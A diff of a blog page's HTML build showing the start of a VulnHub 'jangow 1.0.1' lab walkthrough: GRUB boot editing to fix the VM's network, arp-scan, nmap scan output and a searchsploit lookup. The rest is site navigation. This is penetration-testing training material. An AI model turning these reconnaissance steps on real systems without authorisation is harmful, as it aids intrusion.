@@ -1,1947 +1,331 @@
-<!DOCTYPE html>
-<html lang="en" dir="ltr">
-<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
-  <!--
-Made with Book Theme
-https://github.com/alex-shpak/hugo-book
--->
-
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<meta name="description" content="一、靶机网卡修复#将靶机网络模式修改为NAT模式，按shift，选择第二个回车，再选择第二个，按e，删除&#34;recovery nomodeset&#34;并在末尾添加&#34;quiet splash rw init=/bin/bash，ctrl &#43; x在新的红色界面sudo vim /etc/network/interfaces（尽量用tab键补全），将网卡信息修改为ens33，这里键盘映射问题，无法直接输入:wq，所以先大写，按住shift，再双击Z，接着重置
+<!doctype html><html lang=en dir=ltr><head><meta charset=UTF-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content='一、靶机网卡修复#将靶机网络模式修改为NAT模式，按shift，选择第二个回车，再选择第二个，按e，删除"recovery nomodeset"并在末尾添加"quiet splash rw init=/bin/bash，ctrl + x在新的红色界面sudo vim /etc/network/interfaces（尽量用tab键补全），将网卡信息修改为ens33，这里键盘映射问题，无法直接输入:wq，所以先大写，按住shift，再双击Z，接着重置
 二、识别靶机ip#sudo arp-scan -l，靶机ip为192.168.203.136
 三、端口扫描nmap#快速扫描
 ┌──(kali㉿kali)-[~] └─$ sudo nmap -sS -sV -sC -T4 192.168.203.136 Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-28 06:07 EST Nmap scan report for 192.168.203.136 Host is up (0.0035s latency). Not shown: 998 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 80/tcp open http Apache httpd 2.4.18 |_http-title: Index of / | http-ls: Volume / | SIZE TIME FILENAME | - 2021-06-10 18:05 site/ |_ |_http-server-header: Apache/2.4.18 (Ubuntu) MAC Address: 00:0C:29:17:B0:6C (VMware) Service Info: Host: 127.0.0.1; OS: Unix四、获得shell（失败）#searchsploit#┌──(kali㉿kali)-[~] └─$ searchsploit vsFTPd 3.0.3 -------------------------------------------------------------------------------------------------------------------------- --------------------------------- Exploit Title | Path -------------------------------------------------------------------------------------------------------------------------- --------------------------------- vsftpd 3.0.3 - Remote Denial of Service | multiple/remote/49719.py -------------------------------------------------------------------------------------------------------------------------- --------------------------------- Shellcodes: No Results目标主机FTP版本没有漏洞
-">
-<meta name="theme-color" media="(prefers-color-scheme: light)" content="#ffffff">
-<meta name="theme-color" media="(prefers-color-scheme: dark)" content="#2e3440">
-<meta name="color-scheme" content="light dark"><meta property="og:url" content="http://localhost:1313/docs/cybersecurity/vulnhub/easy/vulnhub_jangow_1.0.1/">
-  <meta property="og:site_name" content="vnccer">
-  <meta property="og:title" content="jangow 1.0.1">
-  <meta property="og:description" content="一、靶机网卡修复#将靶机网络模式修改为NAT模式，按shift，选择第二个回车，再选择第二个，按e，删除&#34;recovery nomodeset&#34;并在末尾添加&#34;quiet splash rw init=/bin/bash，ctrl &#43; x在新的红色界面sudo vim /etc/network/interfaces（尽量用tab键补全），将网卡信息修改为ens33，这里键盘映射问题，无法直接输入:wq，所以先大写，按住shift，再双击Z，接着重置
+'><meta name=theme-color media="(prefers-color-scheme: light)" content="#ffffff"><meta name=theme-color media="(prefers-color-scheme: dark)" content="#2e3440"><meta name=color-scheme content="light dark"><meta property="og:url" content="https://vnccer.github.io/docs/cybersecurity/vulnhub/easy/vulnhub_jangow_1.0.1/"><meta property="og:site_name" content="vnccer"><meta property="og:title" content="jangow 1.0.1"><meta property="og:description" content='一、靶机网卡修复#将靶机网络模式修改为NAT模式，按shift，选择第二个回车，再选择第二个，按e，删除"recovery nomodeset"并在末尾添加"quiet splash rw init=/bin/bash，ctrl + x在新的红色界面sudo vim /etc/network/interfaces（尽量用tab键补全），将网卡信息修改为ens33，这里键盘映射问题，无法直接输入:wq，所以先大写，按住shift，再双击Z，接着重置
 二、识别靶机ip#sudo arp-scan -l，靶机ip为192.168.203.136
 三、端口扫描nmap#快速扫描
-┌──(kali㉿kali)-[~] └─$ sudo nmap -sS -sV -sC -T4 192.168.203.136 Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-28 06:07 EST Nmap scan report for 192.168.203.136 Host is up (0.0035s latency). Not shown: 998 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 80/tcp open http Apache httpd 2.4.18 |_http-title: Index of / | http-ls: Volume / | SIZE TIME FILENAME | - 2021-06-10 18:05 site/ |_ |_http-server-header: Apache/2.4.18 (Ubuntu) MAC Address: 00:0C:29:17:B0:6C (VMware) Service Info: Host: 127.0.0.1; OS: Unix四、获得shell（失败）#searchsploit#┌──(kali㉿kali)-[~] └─$ searchsploit vsFTPd 3.0.3 -------------------------------------------------------------------------------------------------------------------------- --------------------------------- Exploit Title | Path -------------------------------------------------------------------------------------------------------------------------- --------------------------------- vsftpd 3.0.3 - Remote Denial of Service | multiple/remote/49719.py -------------------------------------------------------------------------------------------------------------------------- --------------------------------- Shellcodes: No Results目标主机FTP版本没有漏洞">
-  <meta property="og:locale" content="en">
-  <meta property="og:type" content="article">
-    <meta property="article:section" content="docs">
-    <meta property="article:published_time" content="2026-03-11T00:00:00+00:00">
-    <meta property="article:modified_time" content="2026-05-26T21:52:47+08:00">
-
-
-  <meta itemprop="name" content="jangow 1.0.1">
-  <meta itemprop="description" content="一、靶机网卡修复#将靶机网络模式修改为NAT模式，按shift，选择第二个回车，再选择第二个，按e，删除&#34;recovery nomodeset&#34;并在末尾添加&#34;quiet splash rw init=/bin/bash，ctrl &#43; x在新的红色界面sudo vim /etc/network/interfaces（尽量用tab键补全），将网卡信息修改为ens33，这里键盘映射问题，无法直接输入:wq，所以先大写，按住shift，再双击Z，接着重置
+┌──(kali㉿kali)-[~] └─$ sudo nmap -sS -sV -sC -T4 192.168.203.136 Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-28 06:07 EST Nmap scan report for 192.168.203.136 Host is up (0.0035s latency). Not shown: 998 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 80/tcp open http Apache httpd 2.4.18 |_http-title: Index of / | http-ls: Volume / | SIZE TIME FILENAME | - 2021-06-10 18:05 site/ |_ |_http-server-header: Apache/2.4.18 (Ubuntu) MAC Address: 00:0C:29:17:B0:6C (VMware) Service Info: Host: 127.0.0.1; OS: Unix四、获得shell（失败）#searchsploit#┌──(kali㉿kali)-[~] └─$ searchsploit vsFTPd 3.0.3 -------------------------------------------------------------------------------------------------------------------------- --------------------------------- Exploit Title | Path -------------------------------------------------------------------------------------------------------------------------- --------------------------------- vsftpd 3.0.3 - Remote Denial of Service | multiple/remote/49719.py -------------------------------------------------------------------------------------------------------------------------- --------------------------------- Shellcodes: No Results目标主机FTP版本没有漏洞'><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="article:section" content="docs"><meta property="article:published_time" content="2026-03-11T00:00:00+00:00"><meta property="article:modified_time" content="2026-05-26T21:52:47+08:00"><meta itemprop=name content="jangow 1.0.1"><meta itemprop=description content='一、靶机网卡修复#将靶机网络模式修改为NAT模式，按shift，选择第二个回车，再选择第二个，按e，删除"recovery nomodeset"并在末尾添加"quiet splash rw init=/bin/bash，ctrl + x在新的红色界面sudo vim /etc/network/interfaces（尽量用tab键补全），将网卡信息修改为ens33，这里键盘映射问题，无法直接输入:wq，所以先大写，按住shift，再双击Z，接着重置
 二、识别靶机ip#sudo arp-scan -l，靶机ip为192.168.203.136
 三、端口扫描nmap#快速扫描
-┌──(kali㉿kali)-[~] └─$ sudo nmap -sS -sV -sC -T4 192.168.203.136 Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-28 06:07 EST Nmap scan report for 192.168.203.136 Host is up (0.0035s latency). Not shown: 998 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 80/tcp open http Apache httpd 2.4.18 |_http-title: Index of / | http-ls: Volume / | SIZE TIME FILENAME | - 2021-06-10 18:05 site/ |_ |_http-server-header: Apache/2.4.18 (Ubuntu) MAC Address: 00:0C:29:17:B0:6C (VMware) Service Info: Host: 127.0.0.1; OS: Unix四、获得shell（失败）#searchsploit#┌──(kali㉿kali)-[~] └─$ searchsploit vsFTPd 3.0.3 -------------------------------------------------------------------------------------------------------------------------- --------------------------------- Exploit Title | Path -------------------------------------------------------------------------------------------------------------------------- --------------------------------- vsftpd 3.0.3 - Remote Denial of Service | multiple/remote/49719.py -------------------------------------------------------------------------------------------------------------------------- --------------------------------- Shellcodes: No Results目标主机FTP版本没有漏洞">
-  <meta itemprop="datePublished" content="2026-03-11T00:00:00+00:00">
-  <meta itemprop="dateModified" content="2026-05-26T21:52:47+08:00">
-  <meta itemprop="wordCount" content="1762">
-
-<title>jangow 1.0.1 | vnccer</title>
-<link rel="icon" href="/ak47.png" >
-<link rel="manifest" href="/manifest.json">
-<link rel="canonical" href="http://localhost:1313/docs/cybersecurity/vulnhub/easy/vulnhub_jangow_1.0.1/">
-<link rel="stylesheet" href="/book.min.736951ca3ba5472b01b559ccf11c0bd72daa52528001c9a2789c1ea4a2c2c765.css" integrity="sha256-c2lRyjulRysBtVnM8RwL1y2qUlKAAcmieJwepKLCx2U=" crossorigin="anonymous">
-
-
-  <script defer src="/fuse.min.js"></script>
-  <script defer src="/en.search.min.e387ac3bb04d6aa89f6bb03885d3553dd164ba310df28fe3e658a9ebf680c763.js" integrity="sha256-44esO7BNaqifa7A4hdNVPdFkujEN8o/j5lip6/aAx2M=" crossorigin="anonymous"></script>
-
-  <script defer src="/sw.min.6f6f90fcb8eb1c49ec389838e6b801d0de19430b8e516902f8d75c3c8bd98739.js" integrity="sha256-b2&#43;Q/LjrHEnsOJg45rgB0N4ZQwuOUWkC&#43;NdcPIvZhzk=" crossorigin="anonymous"></script>
-
-
-
-  <script>
-  MathJax = {
-    tex: {
-      inlineMath: [['$', '$'], ['\\(', '\\)']],
-      displayMath: [['$$', '$$'], ['\\[', '\\]']],
-      processEscapes: true,
-      processEnvironments: true
-    },
-    options: {
-      skipHtmlTags: ['script', 'noscript', 'style', 'textarea', 'pre']
-    }
-  };
-</script>
-<script type="text/javascript" id="MathJax-script" async
-  src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js">
-</script>
-</head>
-<body dir="ltr" class="book-kind-page book-type-docs">
-  <input type="checkbox" class="hidden toggle" id="menu-control" />
-  <input type="checkbox" class="hidden toggle" id="toc-control" />
-  <main class="container flex">
-    
-<aside class="book-menu">
-  <div class="book-menu-content">
-    
-  <nav>
-<h2 class="book-brand">
-  <a class="flex align-center" href="/"><img src="/flamez.png" alt="Logo" /><span>vnccer</span>
-  </a>
-</h2>
-
-
-<div class="book-search hidden">
-  <input id="book-search-input" type="text" 
-    placeholder="Search"
-    aria-label="Search"
-    maxlength="64" data-hotkeys="s/" />
-  <div class="book-search-spinner hidden"></div>
-  <ul id="book-search-results"></ul>
-</div>
-<script>document.querySelector(".book-search").classList.remove("hidden")</script>
-
-
-
-
-
-
-
-
-
-
-
-
-
-  
-  <ul>
-    
-      
-        <li>
-          
-  
-  
-
-  
-    <input type="checkbox" id="section-c860f18c28389564163849da32ed5d14" class="toggle"  />
-    <label for="section-c860f18c28389564163849da32ed5d14" class="flex">
-      <a role="button" class="">
-        Project</a>
-      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
-    </label>
-  
-
-          
-  <ul>
-    
-      
-        <li>
-          
-  
-  
-
-  
-    <a href="/docs/project/vigil/" class="">
-      vigil</a>
-  
-
-        </li>
-      
-    
-      
-        <li>
-          
-  
-  
-
-  
-    <a href="/docs/project/vigil-abandoned-version/" class="">
-      vigil(abandoned version)</a>
-  
-
-        </li>
-      
-    
-  </ul>
-
-        </li>
-      
-    
-      
-        <li>
-          
-  
-  
-
-  
-    <input type="checkbox" id="section-8d58ff5c5e366ab14339daed9d222b7f" class="toggle" checked />
-    <label for="section-8d58ff5c5e366ab14339daed9d222b7f" class="flex">
-      <a href="/docs/cybersecurity/" class="">
-        网安</a>
-      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
-    </label>
-  
-
-          
-  <ul>
-    
-      
-        <li>
-          
-  
-  
-
-  
-    <input type="checkbox" id="section-ad627e53d6d1828a1435a85961eea27f" class="toggle"  />
-    <label for="section-ad627e53d6d1828a1435a85961eea27f" class="flex">
-      <a role="button" class="">
-        xnwlaqbc靶机记录</a>
-      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
-    </label>
-  
-
-          
-  <ul>
-    
-      
-        <li>
-          
-  
-  
-
-  
-    <a href="/docs/cybersecurity/xnwlaqbc%E9%9D%B6%E6%9C%BA%E8%AE%B0%E5%BD%95/xnwlaqbc%E9%9D%B6%E6%9C%BA%E9%83%A8%E7%BD%B2%E4%B8%8E%E6%94%BB%E5%87%BB/" class="">
-      xnwlaqbc靶机部署与攻击</a>
-  
-
-        </li>
-      
-    
-      
-        <li>
-          
-  
-  
-
-  
-    <a href="/docs/cybersecurity/xnwlaqbc%E9%9D%B6%E6%9C%BA%E8%AE%B0%E5%BD%95/DDos%E6%94%BB%E5%87%BB%E6%B5%8B%E8%AF%95/" class="">
-      DDos攻击测试日志</a>
-  
-
-        </li>
-      
-    
-  </ul>
-
-        </li>
-      
-    
-      
-        <li>
-          
-  
-  
-
-  
-    <input type="checkbox" id="section-20b418ba6aa317c76a5b35dea36ccbca" class="toggle"  />
-    <label for="section-20b418ba6aa317c76a5b35dea36ccbca" class="flex">
-      <a href="/docs/cybersecurity/DVWA/" class="">
-        DVWA</a>
-      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
-    </label>
-  
-
-          
-  <ul>
-    
-      
-        <li>
-          
-  
-  
-
-  
-    <a href="/docs/cybersecurity/DVWA/dvwa%E5%88%9D%E5%A7%8B%E5%8C%96%E4%BF%AE%E5%A4%8D/" class="">
-      dvwa初始化修复</a>
-  
-
-        </li>
-      
-    
-      
-        <li>
-          
-  
-  
-
-  
-    <a href="/docs/cybersecurity/DVWA/Authorisation-Bypass/" class="">
-      Authorisation Bypass</a>
-  
-
-        </li>
-      
-    
-      
-        <li>
-          
-  
-  
-
-  
-    <a href="/docs/cybersecurity/DVWA/CSRF/" class="">
-      CSRF</a>
-  
-
-        </li>
-      
-    
-      
-        <li>
-          
-  
-  
-
-  
-    <a href="/docs/cybersecurity/DVWA/Open-HTTP-Redirect/" class="">
-      Open HTTP Redirect</a>
-  
-
-        </li>
-      
-    
-      
-        <li>
-          
-  
-  
-
-  
-    <a href="/docs/cybersecurity/DVWA/API/" class="">
-      api</a>
-  
-
-        </li>
-      
-    
-      
-        <li>
-          
-  
-  
-
-  
-    <a href="/docs/cybersecurity/DVWA/CSP-Bypass/" class="">
-      CSP Bypass</a>
-  
-
-        </li>
-      
-    
-      
-        <li>
-          
-  
-  
-
-  
-    <a href="/docs/cybersecurity/DVWA/Cyptography/" class="">
-      Cryptography</a>
-  
-
-        </li>
-      
-    
-      
-        <li>
-          
-  
-  
-
-  
-    <a href="/docs/cybersecurity/DVWA/Command-Injection/" class="">
-      Command Injection</a>
-  
-
-        </li>
-      
-    
-      
-        <li>
-          
-  
-  
-
-  
-    <a href="/docs/cybersecurity/DVWA/File-Inclusion/" class="">
-      File Inclusion</a>
-  
-
-        </li>
-      
-    
-      
-        <li>
-          
-  
-  
-
-  
-    <a href="/docs/cybersecurity/DVWA/SQL-Injection/" class="">
-      SQL Injection</a>
-  
-
-        </li>
-      
-    
-  </ul>
-
-        </li>
-      
-    
-      
-        <li>
-          
-  
-  
-
-  
-    <a href="/docs/cybersecurity/kali_linux%E5%9F%BA%E6%93%8D/" class="">
-      kali_linux基操</a>
-  
-
-        </li>
-      
-    
-      
-        <li>
-          
-  
-  
-
-  
-    <input type="checkbox" id="section-aa6f3e63fd33f2e9fa1487b55c3551ba" class="toggle"  />
-    <label for="section-aa6f3e63fd33f2e9fa1487b55c3551ba" class="flex">
-      <a role="button" class="">
-        SRC</a>
-      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
-    </label>
-  
-
-          
-  <ul>
-    
-      
-        <li>
-          
-  
-  
-
-  
-    <a href="/docs/cybersecurity/SRC/stepfun/" class="">
-      漏洞盒子：阶跃星辰安全应急响应中心</a>
-  
-
-        </li>
-      
-    
-  </ul>
-
-        </li>
-      
-    
-      
-        <li>
-          
-  
-  
-
-  
-    <input type="checkbox" id="section-4ae5ffa90962cdf2660fe74526a01436" class="toggle"  />
-    <label for="section-4ae5ffa90962cdf2660fe74526a01436" class="flex">
-      <a role="button" class="">
-        Vulnerabilities</a>
-      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
-    </label>
-  
-
-          
-  <ul>
-    
-      
-        <li>
-          
-  
-  
-
-  
-    <a href="/docs/cybersecurity/vulnerabilities/Apache-Log4j2CVE-2021-44228%E5%A4%B1%E8%B4%A5%E5%B0%9D%E8%AF%95/" class="">
-      基于docker的log4j2（CVE-2021-44228）漏洞（源问题复现失败）</a>
-  
-
-        </li>
-      
-    
-  </ul>
-
-        </li>
-      
-    
-      
-        <li>
-          
-  
-  
-
-  
-    <input type="checkbox" id="section-e003e03c1feb2b65c7b35f539ae39c73" class="toggle" checked />
-    <label for="section-e003e03c1feb2b65c7b35f539ae39c73" class="flex">
-      <a role="button" class="">
-        VULNHUB</a>
-      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
-    </label>
-  
-
-          
-  <ul>
-    
-      
-        <li>
-          
-  
-  
-
-  
-    <input type="checkbox" id="section-ac34f5c7f66ad3765e4c61f98a3f46fd" class="toggle" checked />
-    <label for="section-ac34f5c7f66ad3765e4c61f98a3f46fd" class="flex">
-      <a role="button" class="">
-        easy</a>
-      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
-    </label>
-  
-
-          
-  <ul>
-    
-      
-        <li>
-          
-  
-  
-
-  
-    <a href="/docs/cybersecurity/vulnhub/easy/vulnhub_drippingblues/" class="">
-      drippingblues</a>
-  
-
-        </li>
-      
-    
-      
-        <li>
-          
-  
-  
-
-  
-    <a href="/docs/cybersecurity/vulnhub/easy/vulnhub_doubletrouble_1/" class="">
-      doubletrouble: 1</a>
-  
-
-        </li>
-      
-    
-      
-        <li>
-          
-  
-  
-
-  
-    <a href="/docs/cybersecurity/vulnhub/easy/vulnhub_Beelzebub_1/" class="">
-      Beelzebub: 1</a>
-  
-
-        </li>
-      
-    
-      
-        <li>
-          
-  
-  
-
-  
-    <a href="/docs/cybersecurity/vulnhub/easy/vulnhub_Empire_Breakout/" class="">
-      Empire Breakout</a>
-  
-
-        </li>
-      
-    
-      
-        <li>
-          
-  
-  
-
-  
-    <a href="/docs/cybersecurity/vulnhub/easy/vulnhub_ICA_1/" class="">
-      ICA: 1</a>
-  
-
-        </li>
-      
-    
-      
-        <li>
-          
-  
-  
-
-  
-    <a href="/docs/cybersecurity/vulnhub/easy/vulnhub_jangow_1.0.1/" class="active">
-      jangow 1.0.1</a>
-  
-
-        </li>
-      
-    
-      
-        <li>
-          
-  
-  
-
-  
-    <a href="/docs/cybersecurity/vulnhub/easy/vulnhub_Napping-1.0.1/" class="">
-      Napping: 1.0.1</a>
-  
-
-        </li>
-      
-    
-      
-        <li>
-          
-  
-  
-
-  
-    <a href="/docs/cybersecurity/vulnhub/easy/vulnhub_Noob_1/" class="">
-      Noob: 1</a>
-  
-
-        </li>
-      
-    
-      
-        <li>
-          
-  
-  
-
-  
-    <a href="/docs/cybersecurity/vulnhub/easy/vulnhub_The-planets_earth/" class="">
-      The planets earth</a>
-  
-
-        </li>
-      
-    
-  </ul>
-
-        </li>
-      
-    
-      
-        <li>
-          
-  
-  
-
-  
-    <input type="checkbox" id="section-ad44293ee93b1d26cf7c58190e7d4815" class="toggle"  />
-    <label for="section-ad44293ee93b1d26cf7c58190e7d4815" class="flex">
-      <a role="button" class="">
-        medium</a>
-      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
-    </label>
-  
-
-          
-  <ul>
-    
-      
-        <li>
-          
-  
-  
-
-  
-    <a href="/docs/cybersecurity/vulnhub/medium/vulnhub_Corrosion2/" class="">
-      Corrosion: 2</a>
-  
-
-        </li>
-      
-    
-      
-        <li>
-          
-  
-  
-
-  
-    <a href="/docs/cybersecurity/vulnhub/medium/vulnhub_Thales/" class="">
-      Thales</a>
-  
-
-        </li>
-      
-    
-      
-        <li>
-          
-  
-  
-
-  
-    <a href="/docs/cybersecurity/vulnhub/medium/vulnhub_Empire_lupinone/" class="">
-      Empire lupinone</a>
-  
-
-        </li>
-      
-    
-  </ul>
-
-        </li>
-      
-    
-      
-        <li>
-          
-  
-  
-
-  
-    <input type="checkbox" id="section-fb378fb748ece0ae1fdeedef24da3db6" class="toggle"  />
-    <label for="section-fb378fb748ece0ae1fdeedef24da3db6" class="flex">
-      <a role="button" class="">
-        hard</a>
-      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
-    </label>
-  
-
-          
-  <ul>
-    
-      
-        <li>
-          
-  
-  
-
-  
-    <a href="/docs/cybersecurity/vulnhub/hard/vulnhub_Matrix-Breakout_-2_Morpheus/" class="">
-      Matrix-Breakout: 2 Morpheus</a>
-  
-
-        </li>
-      
-    
-  </ul>
-
-        </li>
-      
-    
-  </ul>
-
-        </li>
-      
-    
-      
-        <li>
-          
-  
-  
-
-  
-    <input type="checkbox" id="section-5b607fcbb0b7c699a3da0e65a2ffed9b" class="toggle"  />
-    <label for="section-5b607fcbb0b7c699a3da0e65a2ffed9b" class="flex">
-      <a role="button" class="">
-        CTF</a>
-      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
-    </label>
-  
-
-          
-  <ul>
-    
-      
-        <li>
-          
-  
-  
-
-  
-    <input type="checkbox" id="section-7a6315a3240f7682f305097cdf53ea82" class="toggle"  />
-    <label for="section-7a6315a3240f7682f305097cdf53ea82" class="flex">
-      <a role="button" class="">
-        easy</a>
-      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
-    </label>
-  
-
-          
-  <ul>
-    
-      
-        <li>
-          
-  
-  
-
-  
-    <a href="/docs/cybersecurity/CTF/easy/CTF-web-low/" class="">
-      web-low</a>
-  
-
-        </li>
-      
-    
-  </ul>
-
-        </li>
-      
-    
-      
-        <li>
-          
-  
-  
-
-  
-    <input type="checkbox" id="section-f08add9f101710f9ba3d484a35d5581b" class="toggle"  />
-    <label for="section-f08add9f101710f9ba3d484a35d5581b" class="flex">
-      <a role="button" class="">
-        medium</a>
-      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
-    </label>
-  
-
-          
-  <ul>
-    
-  </ul>
-
-        </li>
-      
-    
-      
-        <li>
-          
-  
-  
-
-  
-    <input type="checkbox" id="section-1fdf586d1ea5885edf0672ce206f530c" class="toggle"  />
-    <label for="section-1fdf586d1ea5885edf0672ce206f530c" class="flex">
-      <a role="button" class="">
-        hard</a>
-      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
-    </label>
-  
-
-          
-  <ul>
-    
-  </ul>
-
-        </li>
-      
-    
-  </ul>
-
-        </li>
-      
-    
-  </ul>
-
-        </li>
-      
-    
-      
-        <li>
-          
-  
-  
-
-  
-    <input type="checkbox" id="section-94ed7c835fd2d66c69e86ff967d092f9" class="toggle"  />
-    <label for="section-94ed7c835fd2d66c69e86ff967d092f9" class="flex">
-      <a href="/docs/papers/" class="">
-        论文</a>
-      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
-    </label>
-  
-
-          
-  <ul>
-    
-      
-        <li>
-          
-  
-  
-
-  
-    <a href="/docs/papers/%E5%9F%BA%E4%BA%8E%E5%8F%AF%E5%8F%98%E9%95%BF%E5%BA%8F%E5%88%97%E7%9A%84%E6%81%B6%E6%84%8F%E5%8A%A0%E5%AF%86%E6%B5%81%E9%87%8F%E6%A3%80%E6%B5%8B%E6%96%B9%E6%B3%95/" class="">
-      基于可变长序列的恶意加密流量检测方法</a>
-  
-
-        </li>
-      
-    
-      
-        <li>
-          
-  
-  
-
-  
-    <a href="/docs/papers/ET-BERT/" class="">
-      ET-BERT</a>
-  
-
-        </li>
-      
-    
-      
-        <li>
-          
-  
-  
-
-  
-    <a href="/docs/papers/ET-BERT%E5%A4%8D%E7%8E%B0/" class="">
-      ET-BERT复现</a>
-  
-
-        </li>
-      
-    
-      
-        <li>
-          
-  
-  
-
-  
-    <a href="/docs/papers/%E5%8A%A0%E5%AF%86%E6%B5%81%E9%87%8F%E5%9F%BA%E7%A1%80/" class="">
-      加密流量基础</a>
-  
-
-        </li>
-      
-    
-      
-        <li>
-          
-  
-  
-
-  
-    <a href="/docs/papers/%E6%95%B0%E6%8D%AE%E9%9B%86%E5%88%86%E6%9E%90/" class="">
-      数据集分析</a>
-  
-
-        </li>
-      
-    
-  </ul>
-
-        </li>
-      
-    
-      
-        <li>
-          
-  
-  
-
-  
-    <input type="checkbox" id="section-3db2415e2c74c9bfbf1d5e6eb6dbf6ed" class="toggle"  />
-    <label for="section-3db2415e2c74c9bfbf1d5e6eb6dbf6ed" class="flex">
-      <a role="button" class="">
-        工作</a>
-      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
-    </label>
-  
-
-          
-  <ul>
-    
-      
-        <li>
-          
-  
-  
-
-  
-    <a href="/docs/work/AI%E5%AE%89%E5%85%A8%E6%80%9D%E8%80%83/" class="">
-      AI安全思考</a>
-  
-
-        </li>
-      
-    
-      
-        <li>
-          
-  
-  
-
-  
-    <input type="checkbox" id="section-2c262361fe9aa48cd5d939ca8724680d" class="toggle"  />
-    <label for="section-2c262361fe9aa48cd5d939ca8724680d" class="flex">
-      <a role="button" class="">
-        leetcode</a>
-      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
-    </label>
-  
-
-          
-  <ul>
-    
-      
-        <li>
-          
-  
-  
-
-  
-    <input type="checkbox" id="section-c1a97b113c65b26353860b399a4f8855" class="toggle"  />
-    <label for="section-c1a97b113c65b26353860b399a4f8855" class="flex">
-      <a role="button" class="">
-        哈希</a>
-      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
-    </label>
-  
-
-          
-  <ul>
-    
-      
-        <li>
-          
-  
-  
-
-  
-    <a href="/docs/work/leetcode/1.%E5%93%88%E5%B8%8C/1.%E4%B8%A4%E6%95%B0%E4%B9%8B%E5%92%8C/" class="">
-      1.两数之和</a>
-  
-
-        </li>
-      
-    
-  </ul>
-
-        </li>
-      
-    
-  </ul>
-
-        </li>
-      
-    
-      
-        <li>
-          
-  
-  
-
-  
-    <a href="/docs/work/%E5%AE%9E%E4%B9%A0%E7%AE%80%E5%8E%86/" class="">
-      实习简历</a>
-  
-
-        </li>
-      
-    
-  </ul>
-
-        </li>
-      
-    
-      
-        <li>
-          
-  
-  
-
-  
-    <input type="checkbox" id="section-8ebb29a2ddfb039e11169448c9cf3620" class="toggle"  />
-    <label for="section-8ebb29a2ddfb039e11169448c9cf3620" class="flex">
-      <a href="/docs/skills/" class="">
-        技能</a>
-      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
-    </label>
-  
-
-          
-  <ul>
-    
-      
-        <li>
-          
-  
-  
-
-  
-    <a href="/docs/skills/anaconda%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/" class="">
-      anaconda环境配置</a>
-  
-
-        </li>
-      
-    
-      
-        <li>
-          
-  
-  
-
-  
-    <a href="/docs/skills/linux-clash%E9%83%A8%E7%BD%B2/" class="">
-      linux clash部署</a>
-  
-
-        </li>
-      
-    
-      
-        <li>
-          
-  
-  
-
-  
-    <a href="/docs/skills/pyenv%E7%AE%A1%E7%90%86python%E7%89%88%E6%9C%AC/" class="">
-      pyenv管理python版本</a>
-  
-
-        </li>
-      
-    
-      
-        <li>
-          
-  
-  
-
-  
-    <a href="/docs/skills/SwitchyOmega_mv3%E6%93%8D%E4%BD%9C%E8%AE%B0%E5%BD%95/" class="">
-      SwitchyOmega_mv3操作记录</a>
-  
-
-        </li>
-      
-    
-      
-        <li>
-          
-  
-  
-
-  
-    <a href="/docs/skills/win&#43;r%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4/" class="">
-      win&#43;r常用指令</a>
-  
-
-        </li>
-      
-    
-      
-        <li>
-          
-  
-  
-
-  
-    <a href="/docs/skills/windows%E7%BB%88%E7%AB%AF%E8%B5%B0%E4%BB%A3%E7%90%86/" class="">
-      windows终端/git 走代理</a>
-  
-
-        </li>
-      
-    
-      
-        <li>
-          
-  
-  
-
-  
-    <a href="/docs/skills/%E5%9F%BA%E4%BA%8Evmware%E7%9A%84kali_linux%E4%B8%8B%E7%9A%84docker%E9%83%A8%E7%BD%B2%E5%9D%91%E5%A4%9A/" class="">
-      基于vmware的kali_linux下的docker部署(坑多)</a>
-  
-
-        </li>
-      
-    
-      
-        <li>
-          
-  
-  
-
-  
-    <a href="/docs/skills/%E7%BD%91%E7%AB%99%E6%9E%84%E5%BB%BA/" class="">
-      网站构建</a>
-  
-
-        </li>
-      
-    
-  </ul>
-
-        </li>
-      
-    
-      
-        <li>
-          
-  
-  
-
-  
-    <input type="checkbox" id="section-d096fa83268a84183f67ef634318f12c" class="toggle"  />
-    <label for="section-d096fa83268a84183f67ef634318f12c" class="flex">
-      <a href="/docs/AI/" class="">
-        AI</a>
-      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
-    </label>
-  
-
-          
-  <ul>
-    
-      
-        <li>
-          
-  
-  
-
-  
-    <a href="/docs/AI/claude-code-cli/" class="">
-      claude code cli</a>
-  
-
-        </li>
-      
-    
-      
-        <li>
-          
-  
